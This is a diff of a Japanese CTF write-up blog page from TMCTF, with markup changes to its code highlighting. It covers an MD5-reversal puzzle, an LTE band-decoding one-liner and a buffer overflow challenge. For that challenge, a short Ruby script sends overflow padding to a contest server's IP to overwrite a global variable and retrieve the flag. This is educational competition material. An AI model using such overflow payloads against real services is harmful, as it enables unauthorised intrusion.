@@ -22,6 +22,8 @@
     <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css">
 
     <link rel="stylesheet" href='//blog.urandom.team/css/all.min.css'>
+    <link rel="stylesheet" href='//blog.urandom.team/css/syntax.css'>
+    <link rel="stylesheet" href='//blog.urandom.team/css/custom.css'>
     <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
 
     <link rel="alternate" type="application/rss+xml" title="urandom" href='//blog.urandom.team/index.xml' />
@@ -131,29 +133,56 @@ Decrypt the downloaded file by the following command.</p>
 </blockquote>
 <p>この問題は巨大なJavaScriptから正解の鍵を得るというものです。
 まず、巨大なJavaScriptのうちの多くの部分は定数をGoogleで調べるなどすると、MD5を実装しているということが分かります。そして、次の3つの文字列もMD5のハッシュ値であろうという推測ができます。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ko</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;c33367701511b4f6020ec61ded352059&#34;</span>;
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">ko</span> <span class="o">=</span> <span class="s2">&#34;c33367701511b4f6020ec61ded352059&#34;</span><span class="p">;</span>
 
-<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ka</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;61636f697b57b5b7d389db0edb801fc3&#34;</span>;
+<span class="kd">var</span> <span class="nx">ka</span> <span class="o">=</span> <span class="s2">&#34;61636f697b57b5b7d389db0edb801fc3&#34;</span><span class="p">;</span>
 
-<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">kq</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;d2172edf24129e06f3913376a12919a4&#34;</span>;
-</code></pre></div><p>これらをまたGoogleで調べると、それぞれ次のような文字列であることが分かります。</p>
+<span class="kd">var</span> <span class="nx">kq</span> <span class="o">=</span> <span class="s2">&#34;d2172edf24129e06f3913376a12919a4&#34;</span><span class="p">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>これらをまたGoogleで調べると、それぞれ次のような文字列であることが分かります。</p>
 <ul>
 <li><code>c33367701511b4f6020ec61ded352059</code> → <code>654321</code></li>
 <li><code>61636f697b57b5b7d389db0edb801fc3</code> → <code>qwerty</code></li>
 <li><code>d2172edf24129e06f3913376a12919a4</code> → <code>admin</code></li>
 </ul>
 <p>そして次の処理でこれらの文字列を変数<code>nl</code>に従って並び換えているということが分かります。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
-<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">f</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">f</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">length</span>; ) {
-    <span style="color:#a6e22e">c</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span>[<span style="color:#a6e22e">nl</span>[<span style="color:#f92672">++</span><span style="color:#a6e22e">f</span>]];
-    <span style="color:#a6e22e">d</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span>[<span style="color:#a6e22e">nl</span>[<span style="color:#f92672">++</span><span style="color:#a6e22e">f</span>]];
-    <span style="color:#a6e22e">e</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span>[<span style="color:#a6e22e">nl</span>[<span style="color:#f92672">++</span><span style="color:#a6e22e">f</span>]];
-}
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">d</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">e</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">f</span> <span class="o">&lt;</span> <span class="nx">b</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="nx">c</span> <span class="o">+=</span> <span class="nx">b</span><span class="p">[</span><span class="nx">nl</span><span class="p">[</span><span class="o">++</span><span class="nx">f</span><span class="p">]];</span>
+    <span class="nx">d</span> <span class="o">+=</span> <span class="nx">b</span><span class="p">[</span><span class="nx">nl</span><span class="p">[</span><span class="o">++</span><span class="nx">f</span><span class="p">]];</span>
+    <span class="nx">e</span> <span class="o">+=</span> <span class="nx">b</span><span class="p">[</span><span class="nx">nl</span><span class="p">[</span><span class="o">++</span><span class="nx">f</span><span class="p">]];</span>
+<span class="p">}</span>
 
-<span style="color:#75715e">// ......中略......
-</span><span style="color:#75715e"></span>
-<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">nl</span> <span style="color:#f92672">=</span> [ <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0</span> ];
-</code></pre></div><p>最終的にフラグは<code>TMCTF{q6r4dy5ei2na1twm3}</code>でした。</p>
+<span class="c1">// ......中略......
+</span><span class="c1"></span>
+<span class="kd">var</span> <span class="nx">nl</span> <span class="o">=</span> <span class="p">[</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span> <span class="p">];</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>最終的にフラグは<code>TMCTF{q6r4dy5ei2na1twm3}</code>でした。</p>
 <h1 id="analysis---offensive-200">Analysis - Offensive 200</h1>
 <blockquote>
 <p>Category: Analysis - offensive</p>
@@ -161,55 +190,110 @@ Decrypt the downloaded file by the following command.</p>
 <p>This challenge is composed of a simple remote overflow of a global array. The server address is 52.197.128.90 and the vulnerable application listens on TCP port 80-85. Each port has the same behavior so you can select one of them.</p>
 <p>The following code contains a bug that can be exploited to read back a flag:</p>
 </blockquote>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> pwned;
-<span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">1024</span>];
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="n">pwned</span><span class="p">;</span>
+<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
 
-DWORD WINAPI <span style="color:#a6e22e">CallBack</span>(LPVOID lpParameter) {
-	pwned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-	ZeroMemory(buffer, <span style="color:#ae81ff">1024</span>);
-	SOCKET <span style="color:#f92672">*</span>sock <span style="color:#f92672">=</span> (SOCKET <span style="color:#f92672">*</span>)lpParameter;
-	SOCKET _sock <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>sock;
-	send(_sock, <span style="color:#e6db74">&#34;Welcome&#34;</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0</span>);
-	<span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-	ret <span style="color:#f92672">=</span> recv(_sock, buffer, <span style="color:#ae81ff">1028</span>, <span style="color:#ae81ff">0</span>);
-	printf(<span style="color:#e6db74">&#34;[x] RET: %d.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ret);
-	printf(<span style="color:#e6db74">&#34;[x] PWNED: 0x%x.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pwned);
-	Sleep(<span style="color:#ae81ff">1</span>);
-	<span style="color:#66d9ef">if</span> (((pwned <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFFFF</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xc0fe</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x7eaf</span> <span style="color:#f92672">&amp;&amp;</span> (((pwned <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFF</span>)<span style="color:#f92672">^</span><span style="color:#ae81ff">0x1a1a</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xdae4</span>)) {
+<span class="n">DWORD</span> <span class="n">WINAPI</span> <span class="nf">CallBack</span><span class="p">(</span><span class="n">LPVOID</span> <span class="n">lpParameter</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">pwned</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">ZeroMemory</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+	<span class="n">SOCKET</span> <span class="o">*</span><span class="n">sock</span> <span class="o">=</span> <span class="p">(</span><span class="n">SOCKET</span> <span class="o">*</span><span class="p">)</span><span class="n">lpParameter</span><span class="p">;</span>
+	<span class="n">SOCKET</span> <span class="n">_sock</span> <span class="o">=</span> <span class="o">*</span><span class="n">sock</span><span class="p">;</span>
+	<span class="n">send</span><span class="p">(</span><span class="n">_sock</span><span class="p">,</span> <span class="s">&#34;Welcome&#34;</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+	<span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">ret</span> <span class="o">=</span> <span class="n">recv</span><span class="p">(</span><span class="n">_sock</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">1028</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[x] RET: %d.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[x] PWNED: 0x%x.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">pwned</span><span class="p">);</span>
+	<span class="n">Sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(((</span><span class="n">pwned</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xFFFF</span> <span class="o">^</span> <span class="mh">0xc0fe</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x7eaf</span> <span class="o">&amp;&amp;</span> <span class="p">(((</span><span class="n">pwned</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span><span class="p">)</span><span class="o">^</span><span class="mh">0x1a1a</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xdae4</span><span class="p">))</span> <span class="p">{</span>
 
-			send(_sock, <span style="color:#e6db74">&#34;PWNED&#34;</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0</span>);
-			ReadAndReturn(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;key.txt&#34;</span>, _sock);
-			closesocket(_sock);
-			<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-	}
-	<span style="color:#66d9ef">else</span> {
-		send(_sock, <span style="color:#e6db74">&#34;GO AWAY&#34;</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0</span>);
-		closesocket(_sock);
-	}
+			<span class="n">send</span><span class="p">(</span><span class="n">_sock</span><span class="p">,</span> <span class="s">&#34;PWNED&#34;</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+			<span class="n">ReadAndReturn</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;key.txt&#34;</span><span class="p">,</span> <span class="n">_sock</span><span class="p">);</span>
+			<span class="n">closesocket</span><span class="p">(</span><span class="n">_sock</span><span class="p">);</span>
+			<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">else</span> <span class="p">{</span>
+		<span class="n">send</span><span class="p">(</span><span class="n">_sock</span><span class="p">,</span> <span class="s">&#34;GO AWAY&#34;</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+		<span class="n">closesocket</span><span class="p">(</span><span class="n">_sock</span><span class="p">);</span>
+	<span class="p">}</span>
 
-	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
- }
-</code></pre></div><blockquote>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+ <span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
 <p>Craft a packet that would return a valid flag. Good luck!</p>
 </blockquote>
 <p><code>buffer</code>が1024バイトしか確保されていないにもかかわらず、11行目で <code>ret = recv(_sock, buffer, 1028, 0);</code> と1028バイト読み込むようになっている。したがって、1025-1028バイトの範囲に特定のバイト列を仕込めばよい。満たすべき条件は15行目のif文。</p>
 <p>なぜか <code>nc</code> が1024バイトで送信を打ち切ってしまったので、Rubyで書いた。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;socket&#39;</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
 
-<span style="color:#66d9ef">HOST</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;52.197.128.90&#39;</span>
-port <span style="color:#f92672">=</span> (<span style="color:#ae81ff">80</span><span style="color:#f92672">..</span><span style="color:#ae81ff">85</span>)<span style="color:#f92672">.</span>to_a<span style="color:#f92672">.</span>sample
+<span class="no">HOST</span> <span class="o">=</span> <span class="s1">&#39;52.197.128.90&#39;</span>
+<span class="n">port</span> <span class="o">=</span> <span class="p">(</span><span class="mi">80</span><span class="o">..</span><span class="mi">85</span><span class="p">)</span><span class="o">.</span><span class="n">to_a</span><span class="o">.</span><span class="n">sample</span>
 
-puts <span style="color:#e6db74">&#34;connecting </span><span style="color:#e6db74">#{</span><span style="color:#66d9ef">HOST</span><span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">#{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
-sock <span style="color:#f92672">=</span> <span style="color:#66d9ef">TCPSocket</span><span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#39;52.197.128.90&#39;</span>, port)
+<span class="nb">puts</span> <span class="s2">&#34;connecting </span><span class="si">#{</span><span class="no">HOST</span><span class="si">}</span><span class="s2">:</span><span class="si">#{</span><span class="n">port</span><span class="si">}</span><span class="s2">&#34;</span>
+<span class="n">sock</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;52.197.128.90&#39;</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
 
-payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfe\xc0\x51\xbe</span><span style="color:#e6db74">&#34;</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\xfe\xc0\x51\xbe</span><span class="s2">&#34;</span>
 
-sock<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">8</span>)
-sock<span style="color:#f92672">.</span>send(payload, <span style="color:#ae81ff">0</span>)
-<span style="color:#66d9ef">while</span> r <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>gets
-  puts r
-<span style="color:#66d9ef">end</span>
-</code></pre></div><p>そして正解をメモし忘れた 😇</p>
+<span class="n">sock</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+<span class="k">while</span> <span class="n">r</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">gets</span>
+  <span class="nb">puts</span> <span class="n">r</span>
+<span class="k">end</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>そして正解をメモし忘れた 😇</p>
 <h1 id="misc-100">Misc 100</h1>
 <blockquote>
 <p>Category: Misc(iot and network)</p>
@@ -265,8 +349,15 @@ FF 1D 1F 03 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 </code></pre><p>ここに書き込まれている数値が対応LTEバンドを表している。ビット単位で読んで、あるビットが立っていたら、そのビットと対応するバンドをサポートしていることを意味している。最右ビットがバンド1に対応する。</p>
 <p>寝起きでつらいワンライナーを書いておしまい。エンディアンに注意。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; puts (<span style="color:#ae81ff">0x031F1DFF</span>)<span style="color:#f92672">.</span>to_s(<span style="color:#ae81ff">2</span>)<span style="color:#f92672">.</span>reverse<span style="color:#f92672">.</span>split(<span style="color:#e6db74">//</span>)<span style="color:#f92672">.</span>map { <span style="color:#f92672">|</span>c<span style="color:#f92672">|</span> i <span style="color:#f92672">+=</span><span style="color:#ae81ff">1</span>; <span style="color:#f92672">[</span>c, i<span style="color:#f92672">]</span> }<span style="color:#f92672">.</span>select { <span style="color:#f92672">|</span>x<span style="color:#f92672">|</span> x<span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1&#39;</span> }<span style="color:#f92672">.</span>map { <span style="color:#f92672">|</span>x<span style="color:#f92672">|</span> x<span style="color:#f92672">[</span><span style="color:#ae81ff">1</span><span style="color:#f92672">]</span> }<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#39;,&#39;</span>)
-</code></pre></div>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nb">puts</span> <span class="p">(</span><span class="mh">0x031F1DFF</span><span class="p">)</span><span class="o">.</span><span class="n">to_s</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">reverse</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sr">//</span><span class="p">)</span><span class="o">.</span><span class="n">map</span> <span class="p">{</span> <span class="o">|</span><span class="n">c</span><span class="o">|</span> <span class="n">i</span> <span class="o">+=</span><span class="mi">1</span><span class="p">;</span> <span class="o">[</span><span class="n">c</span><span class="p">,</span> <span class="n">i</span><span class="o">]</span> <span class="p">}</span><span class="o">.</span><span class="n">select</span> <span class="p">{</span> <span class="o">|</span><span class="n">x</span><span class="o">|</span> <span class="n">x</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">==</span> <span class="s1">&#39;1&#39;</span> <span class="p">}</span><span class="o">.</span><span class="n">map</span> <span class="p">{</span> <span class="o">|</span><span class="n">x</span><span class="o">|</span> <span class="n">x</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="p">}</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div>
                     </div>
                 </section>
                 
